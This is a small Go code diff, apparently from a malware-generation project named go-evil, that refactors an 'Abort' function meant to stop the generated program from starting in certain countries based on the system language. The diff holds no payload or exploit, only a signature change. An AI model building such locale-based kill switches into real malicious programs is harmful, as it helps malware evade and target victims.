@@ -5,12 +5,12 @@ import (
 
 	"github.com/TeamPhoneix/go-evil/utility/structure"
 	"github.com/TeamPhoneix/go-evil/utility/structure/functions"
+	"github.com/TeamPhoneix/go-evil/utility/structure/json"
 )
 
 // Disables boot of the program in certain countries
 // The countries are determined by value returned by jibber_jabber, formatted in ISO 639
-func Abort(s_json string, languages string) ([]string, string) {
-	data_object := structure.Receive(s_json)
+func Abort(languages string, data_object *json.Json_t) []string {
 	function_call := "Abort"
 
 	arr := structure.Create_evil_object(languages)
@@ -37,5 +37,5 @@ func Abort(s_json string, languages string) ([]string, string) {
 	data_object.Add_go_import("github.com/cloudfoundry/jibber_jabber")
 	data_object.Add_go_import("github.com/s9rA16Bf4/notify_handler/go/notify")
 
-	return []string{fmt.Sprintf("%s(%s)", function_call, language_array)}, structure.Send(data_object)
+	return []string{fmt.Sprintf("%s(%s)", function_call, language_array)}
 }
